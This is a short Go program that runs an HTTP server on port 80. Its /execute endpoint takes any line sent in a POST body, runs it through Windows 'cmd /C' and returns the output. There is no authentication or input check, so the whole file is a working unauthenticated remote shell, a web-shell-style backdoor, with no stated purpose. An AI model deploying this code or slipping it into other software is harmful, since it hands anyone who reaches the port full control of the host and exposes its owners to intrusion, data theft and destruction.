package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

func main() {
	http.HandleFunc("/execute", executeHandler)
	log.Fatal(http.ListenAndServe(":80", nil))
}

func executeHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	cmd, err := bufio.NewReader(r.Body).ReadString('\n')
	if err != nil {
		http.Error(w, "Failed to read command", http.StatusBadRequest)
		return
	}

	cmd = strings.TrimSuffix(cmd, "\n")
	fmt.Println("Executing", cmd)

	out, err := exec.Command("cmd", "/C", cmd).Output()
	if err != nil {
		fmt.Println("Error", err)
		http.Error(w, "Failed to execute command", http.StatusInternalServerError)
		return
	}

	fmt.Fprint(w, string(out))
}
